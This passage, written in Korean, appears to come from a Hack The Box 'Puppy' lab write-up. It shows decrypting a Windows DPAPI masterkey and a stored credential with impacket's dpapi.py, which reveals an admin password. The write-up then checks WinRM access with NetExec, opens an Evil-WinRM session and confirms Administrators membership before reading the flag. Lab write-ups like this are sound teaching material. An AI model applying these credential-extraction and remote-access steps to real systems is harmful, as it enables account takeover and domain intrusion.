$ printf "AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI
[SKIP]
+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc" | base64 -d > enterprise.credentials
```
 
이후, [impacket](https://github.com/fortra/impacket/tree/master) 도구의 `dpapi.py` 스크립트를 활용하여 **DPAPI MasterKey**를 복호화하였다.

```bash
$ python3 dpapi.py masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

복호화에 성공하여, 다음과 같은 Credential 파일을 해독할 수 있는 DPAPI Master Key를 획득하였다:

```text
0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

위에서 획득한 키를 사용하여 `enterprise.credentials` 파일을 복호화한 결과, 다음과 같은 자격 증명을 획득할 수 있었다:

```bash
$ python3 dpapi.py credential -file ~/htb/puppy/enterprise.credentials -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

### Remote Shell via WinRM (steph.cooper_adm)

Credential 파일을 복호화하여 획득한 자격 증명을 바탕으로, 로컬 터미널에서 `steph.cooper_adm` 계정을 이용해 WinRM 접속 가능 여부를 확인하였다:

```bash
$ nxc winrm puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'        
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)

WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

위 결과를 통해, `steph.cooper_adm` 계정으로 WinRM 포트를 통한 원격 접속이 가능한 상태임을 확인할 수 있다.

`Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속을 시도하였으며, 성공적으로 **steph.cooper_adm 사용자의 PowerShell 세션을 획득**하였다:

![세션 획득](/assets/htb-windows/puppy/adm-shell.png)

`whoami /groups` 명령어를 통해 현재 사용자의 그룹 권한을 확인한 결과 `steph.cooper_adm` 계정은 `BUILTIN\Administrators` 그룹에 속해 있음을 확인할 수 있었다:

```text
PS C:\Users\steph.cooper_adm> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다.

![플래그](/assets/htb-windows/puppy/flag.png)